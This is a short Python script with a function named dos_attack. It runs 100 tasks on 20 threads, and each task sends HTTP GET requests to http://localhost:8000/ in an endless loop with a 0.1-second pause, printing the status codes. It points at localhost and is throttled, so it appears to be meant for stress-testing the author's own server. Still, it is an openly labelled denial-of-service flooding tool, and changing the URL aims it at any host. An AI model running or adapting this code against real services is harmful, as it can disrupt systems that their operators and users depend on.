import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor

def dos_attack():
    while True:
        try:
            response = requests.get("http://localhost:8000/")  # Adjust port if needed
            print(f"Sent request, received status code: {response.status_code}")
            time.sleep(0.1)  # Adding a delay of 0.1 seconds between requests
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

# Limit the number of concurrent threads
with ThreadPoolExecutor(max_workers=20) as executor:  # Limit to 20 threads
    for _ in range(100):  # Launch 100 tasks
        executor.submit(dos_attack)
